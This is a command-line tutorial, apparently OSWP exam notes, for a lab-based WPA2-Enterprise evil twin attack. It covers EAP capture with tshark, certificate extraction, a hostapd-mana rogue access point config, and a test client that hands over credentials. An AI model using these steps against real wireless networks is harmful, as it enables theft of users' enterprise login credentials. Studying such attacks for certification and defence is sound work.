
# 🛡️ WPA2-Enterprise / Evil Twin Attack Flow (OSWP - CLI only)

## 📍 Goal
Simulate a WPA2-Enterprise Evil Twin attack in a SSH-only lab, using only CLI tools. The objective is to:
- Capture the authentication handshake
- Analyze EAP communications
- Extract useful information (CA, server certs)
- Replay the attack using hostapd-mana
- Connect with wpa_supplicant for testing

---

## 1. 📡 Monitor Interface Setup
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

> 🎯 *We put the interface in monitor mode to sniff all wireless traffic.*

---

## 2. 🎯 Capturing EAP Traffic
```bash
sudo tshark -i wlan0 -w enterprise.pcap -Y "eap || eapol"
```

> 📦 *We use `tshark` to capture packets and save them to a PCAP file while filtering only for EAP-related frames.*

Let it run while a client authenticates to the real WPA2-Enterprise network.

---

## 3. 🔍 Analyze EAP handshake
```bash
tshark -r enterprise.pcap -Y "eap" -T fields -e frame.number -e eap.code -e eap.type -e eap.identity
```

> 🧠 *Here we identify the type of EAP exchange and the identity revealed by the supplicant. Useful for determining whether it’s PEAP, TTLS, TLS, etc.*

---

## 4. 🧾 Check Certificate Info
```bash
tshark -r enterprise.pcap -Y "tls.handshake.certificate" -V | less
```

> 🔐 *We look for TLS handshake messages to extract info about the server certificate chain. Look for Common Name (CN), issuer (CA), and expiration.*

---

## 5. 🧪 Extract Certificates
```bash
tshark -r enterprise.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate
```
Then use:
```bash
base64 -d <<< "<paste_base64_cert_here>" > cert.der
openssl x509 -inform DER -in cert.der -text -noout
```

> 🧬 *Extract the server's certificate from the PCAP, convert it, and analyze its contents.*

---

## 6. 🏴‍☠️ Set up hostapd-mana (Evil Twin)
Minimal config example `mana.conf`:
```
interface=wlan0
ssid=FakeCorp
channel=6
logger_syslog=-1
logger_stdout=0
driver=nl80211
ieee8021x=1
auth_algs=1
wpa=0
eap_server=1
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
private_key_passwd=whatever
```
Run:
```bash
sudo hostapd-mana mana.conf
```

> 🎣 *We use hostapd-mana to spawn a rogue AP that mimics the original WPA2-Enterprise network, using the previously extracted certs or fake ones signed with same CA.*

---

## 7. 🤖 wpa_supplicant (Client Side)
Sample config `client.conf`:
```
network={
    ssid="FakeCorp"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="testuser"
    password="password123"
    ca_cert="ca.pem"
    phase2="auth=MSCHAPV2"
}
```
Run:
```bash
sudo wpa_supplicant -i wlan1 -c client.conf -dd
```

> 📶 *This simulates a client attempting to connect to our rogue AP. We monitor and capture credentials in `/tmp/hostapd.credout` or via stdout.*

---

## ✅ Wrap-up
You’ve:
- Captured and dissected a WPA2-Enterprise handshake
- Extracted certs from TLS handshake
- Replicated the network and tricked clients
- Logged EAP credentials via hostapd-mana

This flow is 100% CLI-compatible and tailored for OSWP-style environments without GUI.
